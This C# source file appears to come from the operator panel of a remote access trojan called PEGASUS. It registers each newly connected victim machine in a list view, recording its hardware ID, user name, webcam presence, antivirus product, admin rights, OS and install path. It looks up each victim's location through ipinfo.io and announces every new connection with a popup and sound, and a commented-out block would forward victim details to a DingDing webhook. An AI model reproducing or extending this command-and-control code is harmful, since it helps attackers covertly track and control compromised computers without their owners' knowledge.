namespace PEGASUS.BytesInOut
{
    using custom_alert_notifications;
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using PEGASUS.Properties;
    using System;
    using System.Drawing;
    using System.IO;
    using System.Media;
    using System.Net;
    using System.Windows.Forms;

    /// <summary>
    /// Defines the <see cref="HandleListView" />.
    /// </summary>
    public class HandleListView
    {
        /// <summary>
        /// The AddToListview.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        public void AddToListview(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                lock (PEGASUS.Settings.LockBlocked)
                {
                    try
                    {
                        if (PEGASUS.Settings.Blocked.Count > 0)
                        {
                            if (PEGASUS.Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
                            {
                                client.Disconnected();
                                return;
                            }

                            if (PEGASUS.Settings.Blocked.Contains(client.Ip))
                            {
                                client.Disconnected();
                                return;
                            }
                        }
                    }
                    catch
                    {
                    }
                }

                client.Admin = false;
                if (unpack_msgpack.ForcePathObject("Admin").AsString.ToLower() != "user") client.Admin = true;

                client.LV = new ListViewItem
                {
                    Tag = client,
                    Text = string.Format("{0}:{1}", client.Ip, client.TcpClient.LocalEndPoint.ToString().Split(':')[1])
                };
                string ipinf;

                try
                {
                    string location = GetLocation(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]);
                    string toBeSearched = "\"country\":";
                    string ipaddr = location.Substring(location.IndexOf(toBeSearched) + toBeSearched.Length).Replace("\"", "");
                    string input = ipaddr.Replace(":", "");
                    int index = input.LastIndexOf(",");
                    if (index > 0)
                        input = input.Substring(0, index);
                    ipinf = input.Split(',')[0].Trim();
                    //ipinf = GetUserCountryByIp(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
                    // ipinf = Program.form1.cGeoMain.GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0])
                    //    .Split(':');
                    client.LV.SubItems.Add(ipinf);
                }
                catch
                {
                    client.LV.SubItems.Add("Unknown");
                }
                string loc = GetLocation(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("CPU/GPU").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("GPU RAM").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Camera").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                try
                {
                    client.LV.SubItems.Add(Convert.ToDateTime(unpack_msgpack.ForcePathObject("Install_ed").AsString)
                        .ToLocalTime().ToString());
                }
                catch
                {
                    try
                    {
                        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Install_ed").AsString);
                    }
                    catch
                    {
                        client.LV.SubItems.Add("??");
                    }
                }

                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Anti_virus").AsString);
                client.LV.SubItems.Add("0000 MS");
                client.LV.SubItems.Add("...");
                client.LV.ToolTipText =
                    "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine + " [Geo Location] " + loc.Replace("\"", "").Replace(",", "").Replace(":", "").Replace(" ", Environment.NewLine) + Environment.NewLine;
                //client.LV.ToolTipText += "[Paste_bin] " + unpack_msgpack.ForcePathObject("Paste_bin").AsString;
                client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                client.LV.UseItemStyleForSubItems = false;
                client.LastPing = DateTime.Now;
                Program.form1.Invoke((MethodInvoker)(() =>
                {
                    lock (PEGASUS.Settings.LockListviewClients)
                    {
                        Program.form1.listView1.Items.Add(client.LV);
                        Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                        Program.form1.lv_act.Width = 500;
                    }

                    if (Properties.Settings.Default.Notification)
                    {
                        /*
                    Program.form1.notifyIcon1.BalloonTipText = $@"Connected 
 {client.Ip} : {client.TcpClient.LocalEndPoint.ToString().Split(':')[1]}";
                    Program.form1.notifyIcon1.ShowBalloonTip(100);
                    if (Properties.Settings.Default.DingDing == true && Properties.Settings.Default.WebHook != null && Properties.Settings.Default.Secret != null)
                    {
                        try
                        {
                            string content = $"Client {client.Ip} connected" + "\n"
                                + "Group:" + unpack_msgpack.ForcePathObject("Group").AsString + "\n"
                                + "User:" + unpack_msgpack.ForcePathObject("User").AsString + "\n"
                                    + "OS:" + unpack_msgpack.ForcePathObject("OS").AsString + "\n"
                                    + "User:" + unpack_msgpack.ForcePathObject("Admin").AsString;
                                DingDing.Send(Properties.Settings.Default.WebHook, Properties.Settings.Default.Secret, content);
                            } 
                            catch (Exception ex) 
                            {
                                MessageBox.Show(ex.Message); 
                            }                            
                        }
                    }
                        */

                        var content = $"Client {client.Ip} connected" + "\n"
                                                                      + "Group:" +
                                                                      unpack_msgpack.ForcePathObject("Group").AsString +
                                                                      "\n"
                                                                      + "User:" + unpack_msgpack.ForcePathObject("User")
                                                                          .AsString + "\n"
                                                                      + "OS:" + unpack_msgpack.ForcePathObject("OS")
                                                                          .AsString + "\n"
                                                                      + "User:" + unpack_msgpack
                                                                          .ForcePathObject("Admin").AsString;

                        ShowPopup(content);
                        //DingDing.Send(Properties.Settings.Default.WebHook, Properties.Settings.Default.Secret, content);
                        /*
                        new HandleLogs().Addmsg($"Client {client.Ip} connected", Color.FromArgb(54, 193, 214));                   
                        TimeZoneInfo local = TimeZoneInfo.Local;
                        if (local.Id == "China Standard Time"&& Properties.Settings.Default.Notification == true)
                        {
 
                        }   
                        */
                    }
                }));
            }
            catch
            {
            }
        }

        /// <summary>
        /// Displays a popup with information about a client.
        /// </summary>
        /// <param name="info">The info<see cref="string"/>.</param>
        public void ShowPopup(string info)
        {
            try
            {
                var message = info;
                if (Program.form1.chkSounds.Checked)
                {
                    var sp = new SoundPlayer(Resources.Online);
                    sp.Load();
                    sp.Play();
                }

                alert.Show(message, alert.AlertType.success);
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// The Received.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        public void Received(Clients client)
        {
            try
            {
                lock (PEGASUS.Settings.LockListviewClients)
                {
                    if (client.LV != null)
                        client.LV.ForeColor = Color.FromArgb(54, 193, 214);
                }
            }
            catch
            {
            }
        }

        /// <summary>
        /// The GetLocation.
        /// </summary>
        /// <param name="ip">The ip<see cref="string"/>.</param>
        /// <returns>The <see cref="string"/>.</returns>
        public static string GetLocation(string ip)
        {
            var res = "";
            WebRequest request = WebRequest.Create("http://ipinfo.io/" + ip);
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                string line;
                while ((line = stream.ReadLine()) != null)
                {
                    res += line;
                }
            }
            return res;
        }
    }
}
